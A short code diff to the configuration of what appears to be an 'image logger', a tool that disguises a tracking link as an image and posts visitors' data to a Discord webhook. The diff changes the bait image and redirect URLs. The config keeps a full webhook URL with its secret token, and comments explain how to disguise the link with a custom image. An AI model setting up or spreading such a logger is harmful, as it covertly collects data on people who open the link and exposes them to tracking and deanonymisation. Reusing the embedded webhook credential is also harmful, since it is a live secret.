@@ -11,7 +11,7 @@ __author__ = "_"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1378726524508962816/TMfzYbcU5uXaWsgEb2vGhGqPs4nTeIve6ZyccQGfdZpSM-pu-FOoc-0G2Pt-SUYVmzHs",
-    "image": "https://media.discordapp.net/attachments/1378726289757962334/1378737800207269959/image.png?ex=683db123&is=683c5fa3&hm=9d5fe92b36391f77c03085dc343e8cfd367269cbb26524458e2f6cff116d08fc&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/68/28/4c/68284c53b5f4d7d94cd40fa19c9fd21d.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -49,7 +49,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://tenor.com/hr/view/luna-cat-plinker-plink-gif-1317261633404946088" # Link to the webpage to redirect to 
+        "page": "https://i.pinimg.com/736x/68/28/4c/68284c53b5f4d7d94cd40fa19c9fd21d.jpg" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
